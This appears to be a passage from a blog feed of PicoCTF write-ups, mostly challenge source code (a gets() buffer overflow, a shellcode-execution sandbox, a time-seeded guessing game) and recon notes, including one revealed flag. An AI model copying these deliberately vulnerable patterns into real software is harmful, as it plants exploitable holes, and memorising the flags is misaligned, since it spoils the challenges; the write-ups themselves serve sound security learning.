&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import hashlib

### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
 #extend key to secret length
 new_key = key
 i = 0
 while len(new_key) &amp;lt; len(secret):
 new_key = new_key + key[i]
 i = (i + 1) % len(key) 
 return &amp;#34;&amp;#34;.join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open(&amp;#39;level4.flag.txt.enc&amp;#39;, &amp;#39;rb&amp;#39;).read()
correct_pw_hash = open(&amp;#39;level4.hash.bin&amp;#39;, &amp;#39;rb&amp;#39;).read()


def hash_pw(pw_str):
 pw_bytes = bytearray()
 pw_bytes.extend(pw_str.encode())
 m = hashlib.md5()
 m.update(pw_bytes)
 return m.digest()


def level_4_pw_check():
 user_pw = input(&amp;#34;Please enter correct password for flag: &amp;#34;)
 user_pw_hash = hash_pw(user_pw)
 
 if( user_pw_hash == correct_pw_hash ):
 print(&amp;#34;Welcome back... your flag, user:&amp;#34;)
 decryption = str_xor(flag_enc.decode(), user_pw)
 print(decryption)
 return
 print(&amp;#34;That password is incorrect&amp;#34;)



level_4_pw_check()



# The strings below are 100 possibilities for the correct password. 
# (Only 1 is correct)
pos_pw_list = [&amp;#34;6288&amp;#34;, &amp;#34;6152&amp;#34;, &amp;#34;4c7a&amp;#34;, &amp;#34;b722&amp;#34;, &amp;#34;9a6e&amp;#34;, &amp;#34;6717&amp;#34;, &amp;#34;4389&amp;#34;, &amp;#34;1a28&amp;#34;, &amp;#34;37ac&amp;#34;, &amp;#34;de4f&amp;#34;, &amp;#34;eb28&amp;#34;, &amp;#34;351b&amp;#34;, &amp;#34;3d58&amp;#34;, &amp;#34;948b&amp;#34;, &amp;#34;231b&amp;#34;, &amp;#34;973a&amp;#34;, &amp;#34;a087&amp;#34;, &amp;#34;384a&amp;#34;, &amp;#34;6d3c&amp;#34;, &amp;#34;9065&amp;#34;, &amp;#34;725c&amp;#34;, &amp;#34;fd60&amp;#34;, &amp;#34;4d4f&amp;#34;, &amp;#34;6a60&amp;#34;, &amp;#34;7213&amp;#34;, &amp;#34;93e6&amp;#34;, &amp;#34;8c54&amp;#34;, &amp;#34;537d&amp;#34;, &amp;#34;a1da&amp;#34;, &amp;#34;c718&amp;#34;, &amp;#34;9de8&amp;#34;, &amp;#34;ebe3&amp;#34;, &amp;#34;f1c5&amp;#34;, &amp;#34;a0bf&amp;#34;, &amp;#34;ccab&amp;#34;, &amp;#34;4938&amp;#34;, &amp;#34;8f97&amp;#34;, &amp;#34;3327&amp;#34;, &amp;#34;8029&amp;#34;, &amp;#34;41f2&amp;#34;, &amp;#34;a04f&amp;#34;, &amp;#34;c7f9&amp;#34;, &amp;#34;b453&amp;#34;, &amp;#34;90a5&amp;#34;, &amp;#34;25dc&amp;#34;, &amp;#34;26b0&amp;#34;, &amp;#34;cb42&amp;#34;, &amp;#34;de89&amp;#34;, &amp;#34;2451&amp;#34;, &amp;#34;1dd3&amp;#34;, &amp;#34;7f2c&amp;#34;, &amp;#34;8919&amp;#34;, &amp;#34;f3a9&amp;#34;, &amp;#34;b88f&amp;#34;, &amp;#34;eaa8&amp;#34;, &amp;#34;776a&amp;#34;, &amp;#34;6236&amp;#34;, &amp;#34;98f5&amp;#34;, &amp;#34;492b&amp;#34;, &amp;#34;507d&amp;#34;, &amp;#34;18e8&amp;#34;, &amp;#34;cfb5&amp;#34;, &amp;#34;76fd&amp;#34;, &amp;#34;6017&amp;#34;, &amp;#34;30de&amp;#34;, &amp;#34;bbae&amp;#34;, &amp;#34;354e&amp;#34;, &amp;#34;4013&amp;#34;, &amp;#34;3153&amp;#34;, &amp;#34;e9cc&amp;#34;, &amp;#34;cba9&amp;#34;, &amp;#34;25ea&amp;#34;, &amp;#34;c06c&amp;#34;, &amp;#34;a166&amp;#34;, &amp;#34;faf1&amp;#34;, &amp;#34;2264&amp;#34;, &amp;#34;2179&amp;#34;, &amp;#34;cf30&amp;#34;, &amp;#34;4b47&amp;#34;, &amp;#34;3446&amp;#34;, &amp;#34;b213&amp;#34;, &amp;#34;88a3&amp;#34;, &amp;#34;6253&amp;#34;, &amp;#34;db88&amp;#34;, &amp;#34;c38c&amp;#34;, &amp;#34;a48c&amp;#34;, &amp;#34;3e4f&amp;#34;, &amp;#34;7208&amp;#34;, &amp;#34;9dcb&amp;#34;, &amp;#34;fc77&amp;#34;, &amp;#34;e2cf&amp;#34;, &amp;#34;8552&amp;#34;, &amp;#34;f6f8&amp;#34;, &amp;#34;7079&amp;#34;, &amp;#34;42ef&amp;#34;, &amp;#34;391e&amp;#34;, &amp;#34;8a6d&amp;#34;, &amp;#34;2154&amp;#34;, &amp;#34;d964&amp;#34;, &amp;#34;49ec&amp;#34;]
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - ropfu</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---ropfu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---ropfu/</guid><description>&lt;h1 id="picoctf---ropfu">
 PicoCTF - ropfu
 &lt;a class="anchor" href="#picoctf---ropfu">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP Chain
x86 Calling Convention:
&lt;a href="https://chromium.googlesource.com/chromiumos/docs/&amp;#43;/master/constants/syscalls.md#x86-32_bit">Linux System Call Table&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFSIZE 16

void vuln() {
 char buf[16];
 printf(&amp;#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&amp;#34;);
 return gets(buf);

}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 

 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - RPS</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---rps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---rps/</guid><description>&lt;h1 id="picoctf---rps">
 PicoCTF - RPS
 &lt;a class="anchor" href="#picoctf---rps">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/strstr-in-ccpp/">strstr() in C/C++&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there.
Syntax:&lt;/p></description></item><item><title>PicoCTF - SaaS</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---saas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---saas/</guid><description>&lt;h1 id="picoctf---saas">
 PicoCTF - SaaS
 &lt;a class="anchor" href="#picoctf---saas">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>seccomp-tool&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;error.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;sys/syscall.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#define SIZE 0x100

// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;amp;arch=x86-64&amp;amp;as_format=inline#assembly
#define HEADER &amp;#34;\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&amp;#34;

#define FLAG_SIZE 64

char flag[FLAG_SIZE];

void load_flag() {
 int fd;
 if ((fd = open(&amp;#34;flag.txt&amp;#34;, O_RDONLY)) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;open flag&amp;#34;);
 if (read(fd, flag, FLAG_SIZE) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;read flag&amp;#34;);
 if (close(fd) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;close flag&amp;#34;);
}

void setup() {
 scmp_filter_ctx ctx;
 ctx = seccomp_init(SCMP_ACT_KILL);
 int ret = 0;
 if (ctx != NULL) {
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
 SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 ret |= seccomp_load(ctx);
 }
 seccomp_release(ctx);
 if (ctx == NULL || ret)
 error(EXIT_FAILURE, 0, &amp;#34;seccomp&amp;#34;);
}

int main()
{
 setbuf(stdout, NULL);
 setbuf(stdin, NULL);
 setbuf(stderr, NULL);

 load_flag();
 puts(&amp;#34;Welcome to Shellcode as a Service!&amp;#34;);

 void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 memcpy(addr, HEADER, sizeof(HEADER));
 read(0, addr + sizeof(HEADER) - 1, SIZE);

 setup();
 goto *addr;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</guid><description>&lt;h1 id="picoctf---scavenger-hunt">
 PicoCTF - Scavenger Hunt
 &lt;a class="anchor" href="#picoctf---scavenger-hunt">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:55079/">Scavenger Hunt&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://icodding.blogspot.com/2015/10/htaccess.html">.htaccess 使用技巧彙整&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。
概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。
.htaccess 詳解&lt;/p>&lt;/blockquote>
&lt;h2 id="exploit---insp3ct0r--htaccess--ds_store">
 Exploit - &lt;a href="https://bernie6401.github.io/gYsHjI-rSD6Lce-7eF6DyA">Insp3ct0r&lt;/a> + &lt;code>htaccess&lt;/code> + &lt;code>DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---insp3ct0r--htaccess--ds_store">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>HTML + CSS +JS
These files keeps one fragment flag each. Especially &lt;code>js&lt;/code> file&amp;rsquo;s hint: &lt;code>/* How can I keep Google from indexing my website? */&lt;/code>
&lt;img src="https://i.imgur.com/wuX9KLT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Apache server $\to$ &lt;code>.htaccess&lt;/code> file
&lt;img src="https://i.imgur.com/li2z8l4.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mac computer $\to$ &lt;code>.DS_Store&lt;/code> file
&lt;img src="https://i.imgur.com/iZfLWZ3.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - scrambled-bytes</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/</guid><description>&lt;h1 id="picoctf---scrambled-bytes">
 PicoCTF - scrambled-bytes
 &lt;a class="anchor" href="#picoctf---scrambled-bytes">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.readfog.com/a/1635090435931213824">盤點一款 Python 發包收包利器 - scapy&lt;/a>&lt;/p>
&lt;blockquote>
&lt;h3 id="只發不收">
 只發不收
 &lt;a class="anchor" href="#%e5%8f%aa%e7%99%bc%e4%b8%8d%e6%94%b6">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>send(pkt, inter&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>, loop&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>, count&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, iface&lt;span style="color:#f92672">=&lt;/span>N) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pkt:數據包
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inter&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>發包間隔時間
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>count&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>發包數量
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iface&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>網卡接口名稱
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>send()&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>在第三層發包&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>沒有接收功能&lt;span style="color:#960050;background-color:#1e0010">；&lt;/span>send(IP(dst&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;www.baidu.com&amp;#34;&lt;/span>,ttl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>)&lt;span style="color:#f92672">/&lt;/span>ICMP())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sendp()&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>在第二層發包&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>沒有接收功能&lt;span style="color:#960050;background-color:#1e0010">。&lt;/span>sr(Ether()&lt;span style="color:#f92672">/&lt;/span>IP(dst&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;www.baidu.com&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://docs.python.org/zh-tw/3/library/time.html#time.time">time-時間的訪問和轉換&lt;/a>
&lt;a href="https://zhuanlan.zhihu.com/p/602431298">python 的pyshark庫如何使用&lt;/a>
&lt;a href="https://segmentfault.com/a/1190000006064442">PyShark入門(2)：FileCapture和LiveCapture模塊&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/env python3

import argparse
from progress.bar import IncrementalBar

from scapy.all import *
import ipaddress

import random
from time import time

def check_ip(ip):
 try:
 return ipaddress.ip_address(ip)
 except:
 raise argparse.ArgumentTypeError(f&amp;#39;{ip} is an invalid address&amp;#39;)

def check_port(port):
 try:
 port = int(port)
 if port &amp;lt; 1 or port &amp;gt; 65535:
 raise ValueError
 return port
 except:
 raise argparse.ArgumentTypeError(f&amp;#39;{port} is an invalid port&amp;#39;)

def main(args):
 with open(args.input, &amp;#39;rb&amp;#39;) as f:
 payload = bytearray(f.read())
 random.seed(int(time()))
 random.shuffle(payload)
 with IncrementalBar(&amp;#39;Sending&amp;#39;, max=len(payload)) as bar:
 for b in payload:
 send(
 IP(dst=str(args.destination)) /
 UDP(sport=random.randrange(65536), dport=args.port) /
 Raw(load=bytes([b^random.randrange(256)])),
 verbose=False)
 bar.next()

if __name__==&amp;#39;__main__&amp;#39;:
 parser = argparse.ArgumentParser()
 parser.add_argument(&amp;#39;destination&amp;#39;, help=&amp;#39;destination IP address&amp;#39;, type=check_ip)
 parser.add_argument(&amp;#39;port&amp;#39;, help=&amp;#39;destination port number&amp;#39;, type=check_port)
 parser.add_argument(&amp;#39;input&amp;#39;, help=&amp;#39;input file&amp;#39;)
 main(parser.parse_args())
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Scrambled: RSA</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/</guid><description>&lt;h1 id="picoctf---scrambled-rsa">
 PicoCTF - Scrambled: RSA
 &lt;a class="anchor" href="#picoctf---scrambled-rsa">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Look at the ciphertext, anything fishy, maybe a little bit long?&lt;/li>
&lt;li>What happens if you encrypt the same input multiple times?&lt;/li>
&lt;li>Is RSA deterministic, why would outputs vary?&lt;/li>
&lt;/ul>
&lt;h2 id="recon---通靈">
 Recon - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#recon---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;p>這一題也是頗有趣但要通靈，可以先亂Try&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ nc mercury.picoctf.net 61477
flag = ...
I will encrypt whatever you give me: b
Here you go: 26990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237
I will encrypt whatever you give me: ba
Here you go: 2699004973557840903068237896554908567634409148106041965530669507822650040067943518091441485384345651795926993802543646237181316747733988751129332049819566771732087961765397407420468704229488779578412271162151048595114284277095132529867781110270620027540689911789424114557560291245144389268725220840201190423748281433709412944662646587136176334777506529508638551296181668932027523016538393747587852449462326357575277427356480410273494280971757044562513629423400967407332448126388859817313684399195291279961899276921240210270110225654310423792352532266414306766344869066386142998118001891330035563388790707576505068944
I will encrypt whatever you give me: bac
Here you go: 482814337094129446626465871361763347775065295086385512961816689320275230165383937475878524494623263575752774273564804102734942809717570445625136294234009674073324481263888598173136843991952912799618992769212402102701102256543104237923525322664143067663448690663861429981180018913300355633887907075765050689449619429085627210113794723864117161956939961066630142420889676674025917593454737310140819887001206562193281145515990410131903949359211712425034234736366286462137700473579439657314154736719868903719111785858132034797052503447042089004862886989401543635700329455353580959453911569277021402998961166474045310601826990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237
...
&lt;/code>&lt;/pre>&lt;p>一開始加密的&lt;code>b&lt;/code>是&lt;code>269900...904237&lt;/code>，第二個加密的&lt;code>ba&lt;/code>是&lt;code>26990...5068944&lt;/code>，但如果仔細看其實第一個加密的密文其實也存在其中，他其實是&lt;code>269900...904237+482814...5068944&lt;/code>，可以加密第三個&lt;code>bac&lt;/code>試看看，也會發現是&lt;code>482814...5068944+961942...3106018+269900...904237&lt;/code>
所以我們可以再往這個方向測試一下，我們知道一開始的flag一定是&lt;code>picoCTF{&lt;/code>，我們加密&lt;code>p&lt;/code>會發現密文其實存在原始的flag密文當中，因此我們可以寫一個腳本，像上一題一樣暴力破解，如果加密的密文有存在原本的flag ciphertext中的話，就代表我們猜對了，反之就繼續找&lt;/p></description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</guid><description>&lt;h1 id="picoctf---secrets">
 PicoCTF - Secrets
 &lt;a class="anchor" href="#picoctf---secrets">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: We have several pages hidden. Can you find the one with the flag?&lt;/li>
&lt;li>Hint: folders folders folders&lt;/li>
&lt;/ul>
&lt;p>這一題也是蠻有趣的&lt;/p>
&lt;h2 id="exploit---通靈">
 Exploit - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先看一下網頁的source code，沒什麼特別的地方，但有看到&lt;code>secret/assets/index.css&lt;/code>，所以有一個route是secrets，試看看有甚麼東西
&lt;img src="https://hackmd.io/_uploads/HywRa08_n.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了
&lt;img src="https://hackmd.io/_uploads/HyumC0U_2.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Payload: &lt;code>view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/&lt;/code>
Flag: &lt;code>picoCTF{succ3ss_@h3n1c@10n_790d2615}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/40DYCMInk5E"> secrets | picoCTF 2022 &lt;/a>&lt;/p></description></item><item><title>PicoCTF - seed-sPRiNG</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---seed-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---seed-spring/</guid><description>&lt;h1 id="picoctf---seed-spring">
 PicoCTF - seed-sPRiNG
 &lt;a class="anchor" href="#picoctf---seed-spring">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int guess_height; // [esp+0h] [ebp-18h] BYREF
 int ans; // [esp+4h] [ebp-14h]
 unsigned int seed; // [esp+8h] [ebp-10h]
 int i; // [esp+Ch] [ebp-Ch]
 int *p_argc; // [esp+10h] [ebp-8h]

 p_argc = &amp;amp;argc;
 puts(&amp;amp;unk_A50);
 puts(&amp;amp;unk_A50);
 puts(&amp;#34; &amp;#34;);
 puts(&amp;#34; # mmmmm mmmmm \&amp;#34; mm m mmm &amp;#34;);
 puts(&amp;#34; mmm mmm mmm mmm# mmm # \&amp;#34;# # \&amp;#34;# mmm #\&amp;#34;m # m\&amp;#34; \&amp;#34;&amp;#34;);
 puts(&amp;#34; # \&amp;#34; #\&amp;#34; # #\&amp;#34; # #\&amp;#34; \&amp;#34;# # \&amp;#34; #mmm#\&amp;#34; #mmmm\&amp;#34; # # #m # # mm&amp;#34;);
 puts(&amp;#34; \&amp;#34;\&amp;#34;\&amp;#34;m #\&amp;#34;\&amp;#34;\&amp;#34;\&amp;#34; #\&amp;#34;\&amp;#34;\&amp;#34;\&amp;#34; # # \&amp;#34;\&amp;#34;\&amp;#34;m # # \&amp;#34;m # # # # # #&amp;#34;);
 puts(&amp;#34; \&amp;#34;mmm\&amp;#34; \&amp;#34;#mm\&amp;#34; \&amp;#34;#mm\&amp;#34; \&amp;#34;#m## \&amp;#34;mmm\&amp;#34; # # \&amp;#34; mm#mm # ## \&amp;#34;mmm\&amp;#34;&amp;#34;);
 puts(&amp;#34; &amp;#34;);
 puts(&amp;amp;unk_A50);
 puts(&amp;amp;unk_A50);
 puts(&amp;#34;Welcome! The game is easy: you jump on a sPRiNG.&amp;#34;);
 puts(&amp;#34;How high will you fly?&amp;#34;);
 puts(&amp;amp;unk_A50);
 fflush(stdout);
 seed = time(0);
 srand(seed);
 for ( i = 1; i &amp;lt;= 30; ++i )
 {
 printf(&amp;#34;LEVEL (%d/30)\n&amp;#34;, i);
 puts(&amp;amp;unk_A50);
 LOBYTE(ans) = rand() &amp;amp; 0xF;
 ans = ans;
 printf(&amp;#34;Guess the height: &amp;#34;);
 fflush(stdout);
 __isoc99_scanf(&amp;#34;%d&amp;#34;, &amp;amp;guess_height);
 fflush(stdin);
 if ( ans != guess_height )
 {
 puts(&amp;#34;WRONG! Sorry, better luck next time!&amp;#34;);
 fflush(stdout);
 exit(-1);
 }
 }
 puts(&amp;#34;Congratulation! You&amp;#39;ve won! Here is your flag:\n&amp;#34;);
 fflush(stdout);
 get_flag();
 fflush(stdout);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Sequences</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---sequences/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---sequences/</guid><description>&lt;h1 id="picoctf---sequences">
 PicoCTF - Sequences
 &lt;a class="anchor" href="#picoctf---sequences">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import math
import hashlib
import sys
from tqdm import tqdm
import functools

ITERS = int(2e7)
VERIF_KEY = &amp;#34;96cc5f3b460732b442814fd33cf8537c&amp;#34;
